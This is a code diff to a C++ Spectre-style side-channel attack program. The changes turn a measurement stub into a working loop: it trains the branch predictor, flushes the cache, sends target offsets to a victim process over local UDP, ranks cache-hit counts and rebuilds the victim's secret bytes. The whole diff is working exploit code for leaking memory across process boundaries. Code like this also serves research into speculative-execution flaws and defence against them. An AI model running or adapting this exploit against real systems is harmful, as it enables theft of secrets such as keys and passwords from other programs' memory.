@@ -20,6 +20,8 @@
 #include <vector>
 #include <bitset>
 #include <tuple>
+#include <algorithm>
+#include <numeric>
 
 // C Includes:
 #include <cstdio>
@@ -37,8 +39,9 @@
 #include <unistd.h>
 
 // Local Includes:
-#include "udp-socket.h"
+#include "udp_socket.h"
 #include "defines.h"
+#include "hex_util.h"
 
 
 /********************************************************************
@@ -49,8 +52,8 @@ uint64_t target_array1_va;   // VM Address of victim's array (e.g. array1[])
 uint64_t target_va;          // VM Address of target in victim
 
 // Target offsets (attack only needs this):
-int64_t target_x_offset;  // Offset relative to victim's array1
-int64_t target_size;      // Number of bytes to attempt to read at offset
+uint64_t target_x_offset;  // Offset relative to victim's array1
+uint64_t target_len;      // Number of bytes to attempt to read at offset
 
 
 /********************************************************************
@@ -66,9 +69,13 @@ Analysis code
 /* Default to a cache hit threshold of 80 */
 uint64_t cache_hit_threshold = 80; // TODO: compile-time constexpr...?
 
-std::vector< std::bitset<256> > measurements;  // timeseries of measurements
-int results[256]; // score / byte
+#define ACCURATE_LATENCIES
+#ifdef ACCURATE_LATENCIES
+std::vector< std::array<uint8_t,256> > latency_ts;  // timeseries of access latencies
+#endif
+std::vector< std::bitset<256> > hit_ts;  // timeseries of line hits
 
+//int results[256]; // score / byte
 
 #ifdef NOCLFLUSH
 #define CACHE_FLUSH_ITERATIONS 2048
@@ -124,11 +131,11 @@ void readMemoryByte(uint64_t cache_hit_threshold, size_t malicious_x,
         flush_memory_sse( &array2[i*512] );
 #endif
 
-    training_x = tries % target_size;
+    training_x = tries % target_len;
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     for (int j = 29; j >= 0; j--) {
 #ifndef NOCLFLUSH
-      _mm_clflush( &target_size );
+      _mm_clflush( &target_len );
 #else
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -252,7 +259,7 @@ inline void flush_array2() {
 
 inline void flush_condition() {
 #ifndef NOCLFLUSH
-      _mm_clflush( &target_size );
+      _mm_clflush( &target_len );
 #else
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -334,8 +341,12 @@ void measure_sidechannel(size_t iteration) {
 ///      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
     if (time2 <= cache_hit_threshold) {
 //      results[mix_i]++; /* cache hit - add +1 to score for this value */
-      measurements[iteration].set(mix_i);
+      hit_ts[iteration].set(mix_i);
     }
+
+#ifdef ACCURATE_LATENCIES
+    latency_ts[iteration][mix_i] = static_cast<uint8_t>(time2);
+#endif
   }
 }
 
@@ -406,6 +417,7 @@ void parse_args(int argc, char* const argv[]) {
   *  2: Victim's secret byte count (int64_t)
   *  3: Cache hit threshold (size_t)
   */
+  // TODO: update argument comments...
 
   int c;
   opterr = 0;
@@ -425,7 +437,7 @@ void parse_args(int argc, char* const argv[]) {
       break;
     case 's':
     case 'l':
-      target_size = atoll(optarg);
+      target_len = atoll(optarg);
       break;
     case 'o':
       target_x_offset = atoll(optarg);
@@ -446,44 +458,119 @@ void parse_args(int argc, char* const argv[]) {
 }
 
 
+template <typename T>
+std::vector<size_t> sort_indexes(const std::vector<T>& v) {
+  // Create index vector of identical size to vector v:
+  std::vector<size_t> idx(v.size());
+  std::iota(idx.begin(), idx.end(), 0);
+
+  // Sort index vector based on values in v:
+  std::sort(idx.begin(), idx.end(),
+            [&v](size_t i1, size_t i2) {return v[i1] > v[i2];});
+
+  return idx;
+}
+
+
+
 /********************************************************************
 UDP socket functions.
 ********************************************************************/
 void send_worker(uint16_t port = 7777) {
+  // Socket initialization:
   uint8_t buf[2048];
-
   SocketUDP s;
   assert(s.setRemote("127.0.0.1", port) == 0);
   std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
-  measurements.reserve(1<<20); // Reserve 1 MB of measurements
 
+  constexpr size_t MAX_MEASUREMENTS = 128;
+  std::string secret(target_len, 0);
+
+  // Initialize target x to send to victim:
   msg m = {};
-  m.x = 450; // new relative byte offset
+  m.x = target_x_offset;
 
   size_t tries = 0;
   for (;;) {
     std::string in;
     std::cout << "Ready to send?" << std::endl;
     std::cin >> in;
+    if (in.at(0) != 'r') {
+      if (++m.x > (target_x_offset + target_len)) {
+        break;  // break out of forever loop.
+      }
+    }
 
-    // TODO: Add proper side-channel analysis here...
+    // Timeseries intialization:
+    // - reservation avoids memory allocation during side-channel anaylsis.
+    hit_ts.clear();
+    hit_ts.resize(MAX_MEASUREMENTS); // Pre-allocate measurement space on heap!
+#ifdef ACCURATE_LATENCIES
+    latency_ts.clear();
+    latency_ts.resize(MAX_MEASUREMENTS);
+#endif
 
-    // Repeat 100 times:
-    while (++tries % 100 != 0) {
-      flush_array2(); // This does not flush victim's array...
+
+    // Repeat attack 100 times / byte:
+    // - TODO: replace with a dynamic confidence mechanism?...
+    while (++tries % MAX_MEASUREMENTS != 0) {
+      const auto idx = tries-1;
+
+      // Ensure side-channel array is uncached:
+      flush_array2(); // Does this work on read-only shared memory?...
+
+      // Send request to victim:
       auto bytes = s.send(&m, sizeof(m));
       if (bytes > 0) {
         bytes = s.recv(buf, sizeof(buf));
-        measure_sidechannel(tries);
-        std::cout << "["<<port<<"]- Measured " << measurements[tries].count() << " hits." << std::endl;
+        measure_sidechannel(idx);
+#ifdef DEBUG
+        std::cout << "["<<port<<"]- Measured " << hit_ts[idx].count()
+                  << " hits." << std::endl;
+#endif
       }
       else {
-        std::cout << "["<<port<<"]- Something went wrong on send..." << std::endl;
+        std::cerr <<"["<<port<<"]- Something went wrong on send..." <<std::endl;
         break;
       }
     }
+
+
+    // Summarize measurements:
+    std::vector<size_t> counts(256, size_t(0));
+    for (size_t b = 0; b < counts.size(); b++) {
+      // for each measurement, count all bits set:
+      for (size_t t = 0; t < tries; t++) {
+        if (hit_ts[t].test(b)) {
+          counts[b]++;
+        }
+      }
+    }
+    // Output results from attack:
+    std::cout << "Results for target_x_offset: " << target_x_offset << '\n';
+    auto counts_idx = sort_indexes(counts);
+    size_t last = std::numeric_limits<size_t>::max();
+    for (size_t idx : counts_idx) {
+      const auto hits = counts.at(idx);
+      if (hits == 0) { break; }
+      std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
+                << hits << " hits." << std::endl;
+      last = idx;
+    }
+    if (last < 256) {
+      secret.at(m.x - target_x_offset) = last;
+    }
+
+    // Reset measurements:
+    tries = 0;
   }
+
+  // Print out secret:
+  std::cout << "Finished reading " << target_len
+            << "bytes at offset " << target_x_offset << ":\n"
+            << make_printable(secret) << std::endl;
 }
+
 
 
 /********************************************************************
@@ -508,7 +595,7 @@ int main(int argc, char* const argv[]) {
   else {
     std::cout << "Supplied target_offset:" << target_x_offset << '\n';
   }
-  std::cout << "Reading " << target_size << " bytes."<< std::endl;
+  std::cout << "Reading " << target_len << " bytes."<< std::endl;
 
   // What is this doing?
   #ifdef NOCLFLUSH
